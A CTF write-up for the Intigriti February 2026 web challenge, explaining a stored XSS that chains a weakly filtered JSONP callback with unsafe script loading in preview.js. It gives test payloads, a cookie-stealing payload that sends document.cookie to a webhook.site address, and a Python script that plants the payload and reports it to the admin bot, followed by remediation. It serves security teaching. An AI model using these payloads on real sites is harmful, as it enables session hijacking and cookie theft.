---
title: "Intigriti February Challenge Writeup"
date: 2026-02-27
categories: [CTF, Web Security]
tags: [xss, stored-xss, jsonp, cookie-stealing, intigriti]
author: el_mehdi_dridi
description: "Complete writeup for the Intigriti February 2026 Challenge - Exploiting DOM - XSS on JSONP callback"
---

# Intigriti February Challenge 0226 Writeup

## Overview

This challenge involves exploiting a **DOM based XSS on JSONP callback** that chains two weaknesses: insufficient input sanitization in the JSONP endpoint and unsafe dynamic script loading in the client-side JavaScript. By combining these flaws, we can steal the admin bot's cookies and capture the flag.

![writeup pic](/assets/img/posts/integriti_febr/meme.png)

---

## Vulnerability Description

The application contains a **Stored XSS vulnerability** that chains two weaknesses:

1. **Insufficient input sanitization** in the JSONP endpoint (`/api/jsonp`)
2. **Unsafe dynamic script loading** in the client-side JavaScript (`preview.js`)

When combined, an attacker can inject arbitrary JavaScript that executes in the context of any user (including the admin bot) who views a malicious post.

---

## Vulnerable Code Analysis

### 1. JSONP Endpoint - Weak Callback Filtering

**File:** `app/app.py` (Lines 215-233)

```python
@app.route('/api/jsonp')
def api_jsonp():
    callback = request.args.get('callback', 'handleData')
    
    
    if '<' in callback or '>' in callback:
        callback = 'handleData'
    
    user_data = {
        'authenticated': 'user_id' in session,
        'timestamp': time.time()
    }
    
    if 'user_id' in session:
        user = User.query.get(session['user_id'])
        if user:
            user_data['username'] = user.username
    
    
    response = f"{callback}({json.dumps(user_data)})"
    return Response(response, mimetype='application/javascript')
```

**Problem:** The callback parameter only filters `<` and `>` characters, but allows all other JavaScript syntax including:
- Function calls: `fetch()`, `alert()`
- String concatenation: `+`
- Property access: `document.cookie`
- Comments: `//`

### 2. Unsafe Script Loading in Preview.js

**File:** `app/static/js/preview.js` (Lines 29-40)

```javascript
function processContent(container) {
    const codeBlocks = container.querySelectorAll('pre code');
    codeBlocks.forEach(function(block) {
        block.classList.add('highlighted');
    });
    
    
    const scripts = container.querySelectorAll('script');
    scripts.forEach(function(script) {
        if (script.src && script.src.includes('/api/')) {
            const newScript = document.createElement('script');
            newScript.src = script.src;
            document.body.appendChild(newScript); 
        }
    });
}
```

**Problem:** The function dynamically loads and executes any `<script>` tag with a `src` containing `/api/`. This allows loading the vulnerable JSONP endpoint with an attacker-controlled callback.

---

## Exploitation


### Proof of Concept - Test Payloads

#### Simple Alert Test
```html
<script src="/api/jsonp?callback=alert(document.domain)//"></script>
```

> ![writeup pic](/assets/img/posts/integriti_febr/testing%20payload.png)

**Result:** When viewing the post, an alert box displays `challenge-0226.intigriti.io`

> ![writeup pic](/assets/img/posts/integriti_febr/testing%20result.png)

#### Alert(1) Test
```html
<script src="/api/jsonp?callback=alert(1)//"></script>
```

**Result:** Displays alert with "1"

#### Cookie Exfiltration (Full Exploit)
```html
<script src="/api/jsonp?callback=fetch('https://webhook.site/c11da3ac-5a9f-4205-9e0c-335e68cb5402?c='+document.cookie)//"></script>
```
> ![writeup pic](/assets/img/posts/integriti_febr/pwned.png)


**Result:** Sends victim's cookies to attacker's webhook server

---

## How the Payload Works

Given the payload:
```html
<script src="/api/jsonp?callback=alert(document.domain)//"></script>
```

1. **Post is created** with this content stored in the database

2. **Victim visits** `/post/<id>`

3. **preview.js executes** and calls `processContent()` on the rendered HTML

4. **Script tag is found** with `src` containing `/api/`

5. **New script is created** and appended to document body:
   ```javascript
   const newScript = document.createElement('script');
   newScript.src = "/api/jsonp?callback=alert(document.domain)//";
   document.body.appendChild(newScript);
   ```

6. **Browser requests** `/api/jsonp?callback=alert(document.domain)//`

7. **Server returns:**
   ```javascript
   alert(document.domain)//({"authenticated": true, "timestamp": 1234567890})
   ```
   
   The `//` comments out the rest of the line, leaving only:
   ```javascript
   alert(document.domain)
   ```

8. **JavaScript executes** in victim's browser context

---

## Automated Exploit Script

```python
import requests
from bs4 import BeautifulSoup
from urllib.parse import quote

BASE_URL = "https://challenge-0226.intigriti.io" 
USERNAME = "attacker"
PASSWORD = "password123"
WEBHOOK = "https://webhook.site/c11da3ac-5a9f-4205-9e0c-335e68cb5402"

session = requests.Session()

session.post(f"{BASE_URL}/register", data={"username": USERNAME, "password": PASSWORD})
session.post(f"{BASE_URL}/login", data={"username": USERNAME, "password": PASSWORD})

jsonp_payload = f"fetch('{WEBHOOK}?c='+document.cookie)//"
encoded_callback = quote(jsonp_payload, safe='')
payload = f'<script src="/api/jsonp?callback={encoded_callback}"></script>'

post = session.post(f"{BASE_URL}/post/new", data={"title": "Check this out!", "content": payload})
post_id = post.url.split("/post/")[-1]

session.post(f"{BASE_URL}/report/{post_id}")
print(f"Exploit delivered! Post ID: {post_id}")
```

---

## Impact

An attacker can:
- **Steal session cookies** of any user who views the malicious post
- **Hijack admin sessions** by reporting the post to the admin bot
- **Execute arbitrary JavaScript** in the victim's browser
- **Access sensitive data** visible to the victim
- **Perform actions** on behalf of the victim

---

## Remediation

### Fix 1: Sanitize JSONP Callback (app.py)

```python
import re

@app.route('/api/jsonp')
def api_jsonp():
    callback = request.args.get('callback', 'handleData')
    
    if not re.match(r'^[a-zA-Z_][a-zA-Z0-9_]*$', callback):
        callback = 'handleData'

```

### Fix 2: Remove Dynamic Script Loading (preview.js)

```javascript
function processContent(container) {
    const codeBlocks = container.querySelectorAll('pre code');
    codeBlocks.forEach(function(block) {
        block.classList.add('highlighted');
    });
    
}
```

### Fix 3: Content Security Policy

Add a strict CSP header to prevent inline script execution:
```
Content-Security-Policy: script-src 'self'; object-src 'none';
```


## References

- [OWASP XSS Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html)
- [DOM - XSS on JSONP callback](https://github.com/ossrs/srs/security/advisories/GHSA-gv9r-qcjc-5hj7)